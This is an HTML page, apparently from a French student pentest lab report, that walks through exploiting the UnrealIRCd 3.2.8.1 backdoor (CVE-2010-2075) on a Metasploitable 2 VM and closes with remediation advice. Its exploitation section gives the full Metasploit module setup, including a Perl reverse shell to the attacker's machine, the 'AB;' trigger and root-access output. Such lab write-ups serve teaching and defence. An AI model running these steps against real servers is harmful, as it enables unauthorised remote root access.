@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>UnrealIRCd 3.2.8.1 Backdoor — TP-PENTEST-MS123</title>
+<link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+<div class="page">
+
+  <div class="classification-band">LABO PÉDAGOGIQUE — USAGE INTERNE</div>
+
+  <header class="doc-header">
+    <div class="agency">TP-PENTEST-MS123-2026 &middot; <a href="../index.html" style="color:inherit;">&larr; retour au sommaire</a></div>
+    <h1 class="doc-title">UnrealIRCd 3.2.8.1 — Backdoor</h1>
+    <h2 class="doc-subtitle">Exécution de commande à distance via porte dérobée insérée dans la chaîne de distribution</h2>
+    <table class="meta">
+      <tr><td class="label">Service / Port</td><td>IRC (UnrealIRCd) — port <code class="mono">6667</code></td></tr>
+      <tr><td class="label">Cible</td><td>Metasploitable 2 — <code class="mono">192.168.56.101</code></td></tr>
+      <tr><td class="label">CVE</td><td><a href="https://nvd.nist.gov/vuln/detail/CVE-2010-2075">CVE-2010-2075</a></td></tr>
+      <tr><td class="label">Résultat</td><td><strong>Accès root</strong> (shell de commande)</td></tr>
+      <tr><td class="label">Testé par</td><td>ZANNOU Josaphat</td></tr>
+    </table>
+  </header>
+
+  <h2 class="section">1. Identification</h2>
+  <p>Le scan de reconnaissance sur le port 6667 de la cible identifie un serveur IRC
+  <code>UnrealIRCd</code>. Point important : <code>nmap</code> ne remonte
+  <strong>pas</strong> le numéro de version exact — or la faille visée est spécifique à la
+  version <code>3.2.8.1</code>. Cette version précise sera confirmée à l'étape d'exploitation,
+  lorsque la phase de vérification (<code>check</code>) du module Metasploit validera que la
+  cible est bien vulnérable. Le bandeau <code>irc.Metasploitable.LAN</code> confirme déjà
+  qu'on est sur le serveur IRC volontairement vulnérable de la VM.</p>
+
+  <figure class="capture" id="cap-recon">
+    <img src="../images/ms2-unrealircd/01-recon-nmap.png" alt="Résultat du scan nmap sur le port 6667">
+    <figcaption>
+      <strong class="idx">1.</strong>
+      <span class="desc">Résultat de <code>nmap -sC -sV -p 6667 192.168.56.101</code> : le
+      service est identifié comme <code>UnrealIRCd</code> (bannière
+      <code>irc.Metasploitable.LAN</code>), sans numéro de version dans la sortie.</span>
+      <span class="fname">images/ms2-unrealircd/01-recon-nmap.png</span>
+    </figcaption>
+  </figure>
+
+  <h2 class="section">2. Méthode d'identification de la CVE et du module</h2>
+  <p>Première question indépendante de tout outil : UnrealIRCd a-t-il une faille connue, et
+  pour quelle version ?</p>
+
+  <pre class="terminal">$ searchsploit unrealircd
+
+---------------------------------------------- ---------------------------------
+ Exploit Title                                |  Path
+---------------------------------------------- ---------------------------------
+UnrealIRCd 3.2.8.1 - Backdoor Command Execution      | linux/remote/16922.rb
+UnrealIRCd 3.2.8.1 - Local Configuration Stack Overfl | windows/dos/18011.txt
+UnrealIRCd 3.2.8.1 - Remote Downloader/Execute        | linux/remote/13853.pl
+UnrealIRCd 3.x - Remote Denial of Service             | windows/dos/27407.pl
+---------------------------------------------- ---------------------------------</pre>
+
+  <p>Confirmé — une <strong>backdoor d'exécution de commande</strong> existe pour la version
+  3.2.8.1. <code>searchsploit</code> ne donne ni la CVE ni un chemin de module directement
+  utilisable ; étape suivante, chercher <strong>dans <code>msfconsole</code></strong> puisque
+  c'est l'outil choisi pour l'exploitation :</p>
+
+  <pre class="terminal">$ msfconsole -q -x "search unrealircd; exit"
+
+#  Full Name                                   Disclosure Date  Rank       Check  Name
+-  ---------                                   ---------------  ----       -----  ----
+0  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  Yes    UnrealIRCD 3.2.8.1 Backdoor Command Execution</pre>
+
+  <p><strong>C'est de là que vient le chemin exact
+  <code>exploit/unix/irc/unreal_ircd_3281_backdoor</code></strong> — un seul module, de rang
+  <code>excellent</code>, qui dispose d'une fonction <code>check</code> (colonne
+  <code>Check: Yes</code>) permettant de vérifier la vulnérabilité avant de tirer. Reste à
+  obtenir la CVE et le mécanisme :</p>
+
+  <pre class="terminal">$ msfconsole -q -x "info exploit/unix/irc/unreal_ircd_3281_backdoor; exit"
+
+Description:
+  This module exploits a malicious backdoor that was added to the
+  Unreal IRCD 3.2.8.1 download archive.
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2010-2075
+  http://www.unrealircd.com/txt/unrealsecadvisory.20100612.txt</pre>
+
+  <p>La section <code>References</code> confirme <strong>CVE-2010-2075</strong>. La
+  description donne la nature de la faille : en novembre 2009, l'archive source officielle
+  d'UnrealIRCd 3.2.8.1 a été remplacée par une version trafiquée sur les miroirs de
+  téléchargement — une compromission de la <strong>chaîne de distribution logicielle</strong>
+  (supply chain), exactement comme vsftpd 2.3.4, et non une faille de conception du code
+  légitime. Le code injecté surveille les données reçues : toute ligne commençant par le
+  préfixe magique <code>AB;</code> voit le reste de la ligne passé directement à
+  <code>system()</code> côté serveur, exécuté avec les droits du démon — ici
+  <strong>root</strong>.</p>
+
+  <blockquote class="evidence">
+    Backdoor déclenchée par une ligne préfixée <code>AB;</code> envoyée sur le port IRC
+    &mdash; aucune authentification requise. La commande qui suit s'exécute en root.
+  </blockquote>
+
+  <figure class="capture" id="cap-recherche">
+    <img src="../images/ms2-unrealircd/02-recherche-module.png" alt="Résultat de searchsploit puis search unrealircd dans msfconsole">
+    <figcaption>
+      <strong class="idx">2.</strong>
+      <span class="desc">Les deux recherches à la suite : <code>searchsploit unrealircd</code>
+      confirme qu'une backdoor connue existe pour la 3.2.8.1, puis
+      <code>search unrealircd</code> dans <code>msfconsole</code> donne le chemin exact du
+      module (<code>exploit/unix/irc/unreal_ircd_3281_backdoor</code>).</span>
+      <span class="fname">images/ms2-unrealircd/02-recherche-module.png</span>
+    </figcaption>
+  </figure>
+
+  <figure class="capture" id="cap-info-cve">
+    <img src="../images/ms2-unrealircd/03-info-cve.png" alt="Résultat de info sur le module, section References">
+    <figcaption>
+      <strong class="idx">3.</strong>
+      <span class="desc">Résultat de <code>info</code> sur le module : la section
+      <code>References</code> donne <strong>CVE-2010-2075</strong>, et la description explique
+      le mécanisme de la porte dérobée (<code>AB;</code>).</span>
+      <span class="fname">images/ms2-unrealircd/03-info-cve.png</span>
+    </figcaption>
+  </figure>
+
+  <h2 class="section">3. Démarche d'exploitation</h2>
+  <p>Le module Metasploit dédié existant déjà, aucune recherche d'exploit supplémentaire
+  n'était nécessaire. Démarche interactive dans <code>msfconsole</code>, commande par
+  commande :</p>
+
+  <pre class="terminal">msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 192.168.56.101
+RHOSTS => 192.168.56.101
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RPORT 6667
+RPORT => 6667
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 192.168.56.1
+LHOST => 192.168.56.1
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set LPORT 4444
+LPORT => 4444
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload cmd/unix/reverse_perl
+payload => cmd/unix/reverse_perl</pre>
+
+  <p><strong class="field">Point d'attention —</strong> <code>LHOST</code> et
+  <code>LPORT</code> sont obligatoires : le payload choisi (<code>cmd/unix/reverse_perl</code>)
+  est un <em>reverse shell</em>, il établit une connexion retour vers l'attaquant et doit donc
+  savoir où se connecter. Le payload Meterpreter proposé par défaut par le module n'aboutissait
+  pas sur cette cible très ancienne ; <code>cmd/unix/reverse_perl</code>, qui s'appuie sur
+  l'interpréteur perl déjà présent sur la VM, est fiable ici.</p>
+
+  <figure class="capture" id="cap-config">
+    <img src="../images/ms2-unrealircd/04-exploit-config.png" alt="Configuration du module avant lancement">
+    <figcaption>
+      <strong class="idx">4.</strong>
+      <span class="desc">Chargement du module et configuration des options
+      (<code>RHOSTS</code>, <code>RPORT</code>, <code>LHOST</code>, <code>LPORT</code>,
+      <code>payload</code>) avant le déclenchement.</span>
+      <span class="fname">images/ms2-unrealircd/04-exploit-config.png</span>
+    </figcaption>
+  </figure>
+
+  <p>Une fois la configuration validée, <code>exploit -z</code> déclenche l'attaque (le
+  <code>-z</code> bascule la session en arrière-plan dès son ouverture) :</p>
+
+  <pre class="terminal">msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit -z
+[*] Started reverse TCP handler on 192.168.56.1:4444
+[*] 192.168.56.101:6667 - Connected to 192.168.56.101:6667
+[*] 192.168.56.101:6667 - Trying to register a new IRC user: keneth
+[+] 192.168.56.101:6667 - The target appears to be vulnerable. UnrealIRCd detected via IRC commands
+[*] 192.168.56.101:6667 - Connected to 192.168.56.101:6667
+[*] 192.168.56.101:6667 - Sending IRC backdoor command
+[*] Command shell session 1 opened (192.168.56.1:4444 -> 192.168.56.101:58940)
+[*] Session 1 created in the background.</pre>
+
+  <figure class="capture" id="cap-launch">
+    <img src="../images/ms2-unrealircd/05-exploit-launch.png" alt="Déclenchement de exploit -z et ouverture de la session">
+    <figcaption>
+      <strong class="idx">5.</strong>
+      <span class="desc"><code>exploit -z</code> en action : le module confirme la cible
+      vulnérable (phase <code>check</code>), envoie la commande backdoor préfixée
+      <code>AB;</code>, et ouvre un shell de commande.</span>
+      <span class="fname">images/ms2-unrealircd/05-exploit-launch.png</span>
+    </figcaption>
+  </figure>
+
+  <h2 class="section">4. Preuve d'accès obtenu</h2>
+  <p>La commande <code>sessions -c '...' -i 1</code> exécute <code>id</code>,
+  <code>uname -a</code> et <code>hostname</code> directement dans la session ouverte :</p>
+
+  <pre class="terminal">msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > sessions -c 'id; uname -a; hostname' -i 1
+[*] Running 'id; uname -a; hostname' on shell session 1 (192.168.56.101)
+uid=0(root) gid=0(root)
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+metasploitable</pre>
+
+  <p>L'accès est <strong>root</strong> directement, sans étape d'élévation de privilèges : le
+  démon IRC tournait avec les droits root, donc la commande injectée par la backdoor s'exécute
+  en root.</p>
+
+  <figure class="capture" id="cap-preuve">
+    <img src="../images/ms2-unrealircd/06-session-root.png" alt="Shell root confirmé">
+    <figcaption>
+      <strong class="idx">6.</strong>
+      <span class="desc">Sortie de <code>sessions -c 'id; uname -a; hostname' -i 1</code>
+      confirmant l'accès root (<code>uid=0(root) gid=0(root)</code>) sur l'hôte
+      <code>metasploitable</code>.</span>
+      <span class="fname">images/ms2-unrealircd/06-session-root.png</span>
+    </figcaption>
+  </figure>
+
+  <h2 class="section">5. Remédiation</h2>
+  <div class="verdict-box">
+    <span class="verdict-label">RECOMMANDATIONS</span>
+    <ul style="margin-top:6px;">
+      <li>Mettre à jour UnrealIRCd vers une version ultérieure non affectée par cette
+      compromission historique (toute version postérieure à juin 2010, ou l'archive
+      ré-authentifiée par le projet).</li>
+      <li>Vérifier systématiquement l'intégrité des archives source téléchargées (hash
+      SHA-256 / signature GPG publiés par le mainteneur) avant compilation et déploiement,
+      en particulier pour un service exposé.</li>
+      <li>Appliquer le principe de moindre privilège : faire tourner le démon IRC sous un
+      compte de service dédié non privilégié, jamais en root, pour qu'une compromission
+      n'aboutisse pas directement à un accès root.</li>
+      <li>Ne pas exposer un service IRC interne sur le réseau sans contrôle d'accès, et
+      journaliser/alerter sur les connexions aux ports de service inhabituels.</li>
+    </ul>
+  </div>
+
+  <h2 class="section">6. Sources</h2>
+  <ul>
+    <li>Write-up technique détaillé : <a href="../../ms2/josa/unrealircd.md"><code>ms2/josa/unrealircd.md</code></a> (dépôt du labo)</li>
+    <li>CVE-2010-2075 : <a href="https://nvd.nist.gov/vuln/detail/CVE-2010-2075">nvd.nist.gov/vuln/detail/CVE-2010-2075</a></li>
+    <li>Avis de sécurité officiel UnrealIRCd : <a href="http://www.unrealircd.com/txt/unrealsecadvisory.20100612.txt">unrealsecadvisory.20100612.txt</a></li>
+  </ul>
+
+  <div class="status-footer">FIN DE SECTION — UnrealIRCd 3.2.8.1 BACKDOOR</div>
+  <div class="signoff">KAGBAHINTO Jules &amp; ZANNOU Josaphat</div>
+
+</div>
+</body>
+</html>
